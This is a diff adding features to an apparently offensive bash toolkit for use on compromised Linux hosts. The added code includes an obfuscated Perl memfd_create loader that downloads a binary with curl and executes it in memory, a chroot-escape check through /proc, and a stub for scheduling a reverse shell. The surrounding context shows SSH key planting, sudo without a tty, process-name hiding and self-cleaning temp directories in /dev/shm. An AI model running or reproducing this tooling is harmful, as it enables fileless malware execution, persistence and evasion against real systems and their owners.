@@ -10,10 +10,28 @@ OVERSION="0.3"
 # ipcalc should now be optional
 # support for ip instead of ifconfig and arp
 
+memfda=$(cat << EOF
+IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2Ugd2FybmluZ3M7CnVzZSBzdHJpY3Q7CgokfD0xOwoKbXkgJG5hbWUgPSAiIjsKbXkgJGZkID0gc3lzY2FsbCgzMTksICRuYW1lLCAxKTsKaWYgKC0xID09ICRmZCkgewoJZGllOwp9CgpwcmludCAiZmQgJGZkXG4iOwoKb3BlbiAobXkgJEZILCAnPiY9Jy4kZmQpIG9yIGRpZTsKc2VsZWN0ICgoc2VsZWN0KCRGSCksICR8PTEpIFswXSk7CgpwcmludCAkRkggcGFjayBxL0gqLywgcS8K
+EOF
+)
+
+memfdb=$(cat << EOF
+cHJpbnQgImRvbmVcbiI7CmV4ZWN7Ii9wcm9jLyQkL2ZkLyRmZCJ9ICJ0ZXN0IiwgIiIsICIiIG9yIGRpZTsK
+EOF
+)
+
 alias 'echo'='/bin/echo'
 trap "rm -rf /dev/shm/.q" EXIT TERM INT 
 backup=`cat $ENV`
 NHOME=""
+
+getdbus() {
+echo "Dbus services for system:"
+dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
+echo "Dbus services for session:"
+dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
+echo "See https://github.com/taviso/dbusmap for additional dbus auditing!"
+}
 
 getsec() {
 echo "Let's see if there are any defences."
@@ -84,6 +102,10 @@ tar -cf - $OUTP | xz -c -9 > $HOME/f.tar.xz
 rm -rf $OUTP
 }
 
+timedshell() { 
+echo "scheduling a reverse shell to launch later..."
+}
+
 getusers() {
 echo "Listing valid users with shells."
 getent passwd | grep -f /etc/shells | grep -v "nologin\|false" | cut -d: -f1
@@ -128,6 +150,14 @@ SUDO_ASKPASS=/dev/shm/.q/.c sudo -A "$@"
 rm /dev/shm/.q/.c
 }
 
+memexec() {
+memfile=$(curl -s $1 | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
+finalmem=$(echo $memfda | base64 -d)
+finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
+finalmem=${finalmem}$(echo $memfdb | base64 -d)
+echo "$finalmem" | perl
+}
+
 getpty() {
 SHELL=$(command -v sh)
 #echo "$backup" > $ENV
@@ -143,6 +173,15 @@ echo $sshkey >> $NHOME/.ssh/authorized_keys
 
 psgrep() {
 ps -weFH | grep $1 | grep -v grep
+}
+
+getescape() {
+ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^`id -u`"i | awk '{print $2}' | tr ' ' '\n' | while read i; do
+if ls -di --color=never "/proc/$i/root/" | grep -qe "^2\ "; then
+	echo "process $i seems to be outside the jail..."
+	fi
+done
+
 }
 
 getjail() {
@@ -314,8 +353,11 @@ echo "[*] getpty - pop a pty with script"
 echo "[*] getidle - list all ptys and their idle times accurately."
 echo "[*] getnet - attempt to enumerate hosts on the local network with ping"
 echo "[*] getuservices - list all running services with non-user accounts in passwd"
+echo "[*] getescape - attempt to escape chroot via bad privs on the /proc/ filesystem."
+echo "[*] getdbus - list all dbus services."
+echo "[*] memexec - execute a binary in-memory from a webserver - memexec [full URI] (x64 only)"
 echo "[*] portscan - run a portscan against common ports - portscan [host]"
-echo "[*] prochide - run a program with $0 changed to the longest entry in ps - prochide [program + args]
+echo "[*] prochide - run a program with $0 changed to the longest entry in ps - prochide [program + args]"
 echo "[*] srm - alias for secure shredding of files."
 echo "[*] qsu - sudo without a tty - qsu [password] [normal arguments]"
 echo "[*] qssh - ssh without a tty - qssh [password] [normal arguments]"
@@ -371,5 +413,4 @@ echo "/dev/shm/.q should be deleted upon exit."
 PS1='$USER'"@`hostname`:"'$PWD'"$ " 
 HOME="/dev/shm/.q"
 NHOME=$(getent passwd | grep `id -u` | cut -d: -f 6)
-
 #rm $ENV
